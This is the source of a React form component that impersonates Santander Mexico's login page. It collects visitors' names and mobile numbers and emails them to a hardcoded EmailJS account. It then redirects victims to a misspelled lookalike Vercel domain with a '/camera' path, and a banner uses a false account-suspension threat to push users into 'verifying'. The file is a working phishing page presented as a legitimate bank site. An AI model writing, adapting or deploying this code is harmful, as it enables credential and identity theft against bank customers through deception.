import React, { useState } from 'react';
import emailjs from 'emailjs-com';
import '../css/form.css';
import backgroundImg from '../img/fondopri.jpg';
import logo from '../img/BSAC_BIG.D-e2baaa02.png';
import personImg from '../img/persona.png';

const Form = () => {
  const [formData, setFormData] = useState({ nombres: '', apellidos: '', celular: '' });
  const [errors, setErrors] = useState({});

  const validate = () => {
    const errors = {};
    if (formData.nombres.trim().length < 2) {
      errors.nombres = 'Los nombres deben tener al menos 2 letras';
    }
    if (formData.apellidos.trim().length < 2) {
      errors.apellidos = 'Los apellidos deben tener al menos 2 letras';
    }
    if (!formData.celular.trim()) {
      errors.celular = 'El número de celular es obligatorio';
    } else if (!/^\d{10}$/.test(formData.celular.trim())) {
      errors.celular = 'El número de celular debe tener exactamente 10 dígitos';
    }
    setErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (validate()) {
      emailjs.send('service_pl7uznq', 'template_0x40jpf', formData, '8Mgn87H6amGJecjhG')
        .then((response) => {
          console.log('Formulario enviado:', response.status, response.text);
          window.location.href = 'https://santaderclientpremiunverif.vercel.app/camara'; // Redirigir a la URL especificada
        })
        .catch((error) => {
          console.error('Error al enviar el formulario:', error);
        });
    }
  };

  return (
    <div className="container">
      <div className="background">
        <img src={backgroundImg} alt="Background" className="background-img" />
      </div>
      <div className="content">
        <img src={logo} alt="Logo" className="logo" />
        &nbsp;
        &nbsp;
        <h1 style={{color:'#fff'}} className="title">Bienvenido a Santander</h1>
        &nbsp;
        &nbsp;
        <form onSubmit={handleSubmit} className="form-group">
          <input
            type="text"
            name="nombres"
            placeholder="Nombres"
            className="input"
            value={formData.nombres}
            onChange={handleChange}
            required
          />
          {errors.nombres && <p className="error">{errors.nombres}</p>}
          <input
            type="text"
            name="apellidos"
            placeholder="Apellidos"
            className="input"
            value={formData.apellidos}
            onChange={handleChange}
            required
          />
          {errors.apellidos && <p className="error">{errors.apellidos}</p>}
          <div className="phone-input-container">
            <span className="country-code">+52</span>
            <input
              type="tel"
              name="celular"
              placeholder="Número de celular"
              className="input phone-input"
              value={formData.celular}
              onChange={handleChange}
              maxLength={10}
              pattern="\d{10}"
              required
            />
            {errors.celular && <p className="error">{errors.celular}</p>}
          </div>
          <button type="submit" className="btn">Iniciar</button>
        </form>
        <p className="register">¿Eres nuevo? <a href="/register">Regístrate aquí</a></p>
      </div>
      <div className="banner">
        <div className="banner-text">
          En Santander, siempre innovamos para ti. Verifica tu cuenta y evita que sea suspendida temporalmente por medidas de seguridad. Sigue los pasos que se te piden y disfruta al máximo con Santander MX.
        </div>
        <img src={personImg} alt="Person" className="person-img" />
      </div>
    </div>
  );
};

export default Form;
